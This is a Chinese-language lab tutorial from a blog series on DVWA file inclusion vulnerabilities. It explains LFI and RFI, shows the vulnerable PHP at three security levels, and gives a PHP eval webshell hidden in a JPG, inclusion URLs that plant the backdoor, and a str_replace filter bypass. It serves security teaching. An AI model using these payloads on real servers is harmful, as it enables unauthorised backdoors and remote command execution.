---
title: 文件包含漏洞
date: 2021-01-26 20:38:00
categories:
- [Kali从入门到入狱, OWASP安全渗透实战]
tags: Kali
---

# 文件包含漏洞

## Principle and Harm

**文件包含漏洞：**

即File Inclusion，意思是文件包含（漏洞），指当服务器开启`allow_url_include`选项时，就可以通过 php 的某些特性函数` include() , require()和inelude_once() , require_once() `利用 url 去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致住意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的`allow_url_fopen`选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。

1. 文件包含(File Inclusion ) 即程序通过[包含函数]调用本地或远程文件，以此来实现拓展功能
2. 被包含的文件可以是各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行或文件上传漏洞
3. 文件包含漏洞主要发生在有包含语句的环境中，例独PHP所具备include、require等包含函数

**文件包含分为两类:**

- 本地文件包含LFI ( Local File Inclusion )当被包含的文件在服务器本地时，就形成本地文件包含
- 远程文件包含RFI (Remote File Inclusion ）当被包含的文件在第三方服务器时，叫做远程文件包含

## File Inclusion

### Security Level：Low

#### File Inclusion Source

```php
<?php
    $file = $_GET['page']; //The page we wish to display 
?> 
```

未做任何文件包含过滤，可使用最简单的远程文件包含

#### Local File Inclusion + Webshell

结合图片文件上传使用，图片不应超过20KB，否则可能无法执行

1. 制作一句话图片木马

   ```php
   # Webshell.php
   <?fputs(fopen("shell0.php", "w"), "<?php @eval($_POST['chopper']); ?>")?>
   ```

   ```shell
   # 用工具edjpgcom生成一句话图片木马或者Windows命令
   copy cat.jpg /b + Webshell.php /a cat0.jpg
   ```

2. 上传图片木马文件

3. 执行文件包含并生成后门

   `http://192.168.111.18/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/cat0.jpg`

4. 通过菜刀连接Webshell

#### Remote File Inclusion + Webshell

将图片马或者可生成后门文件代码的txt文件上传到第三方服务器，直接包含远程文件，执行文件并生成后门

`http://192.168.111.18/dvwa/vulnerabilities/fi/?page=http://192.168.111.16/cat0.txt`

### Security Level：Medium

#### File Inclusion Source

```php
<?php
    $file = $_GET['page']; // The page we wish to display 

    // Bad input validation
    $file = str_replace("http://", "", $file);
    $file = str_replace("https://", "", $file);        
?> 
```

后端代码过滤了htpp://和htpps://字符，置空字符

根据函数`str_replace()`可用以下原理

`'http' + 'http://' + '://' = 'http://'`

使用：`http://192.168.111.18/dvwa/vulnerabilities/fi/?page=hthttp://tp://192.168.111.16/cat0.txt`

### Security Level：High

#### File Inclusion Source

```php
<?php
    $file = $_GET['page']; //The page we wish to display 

    // Only allow include.php
    if ( $file != "include.php" ) {
        echo "ERROR: File not found!";
        exit;
    }
?> 
```

后端代码显示包含文件只要不是include.php文件就不能包含，额...写死了文件包含，无解吧……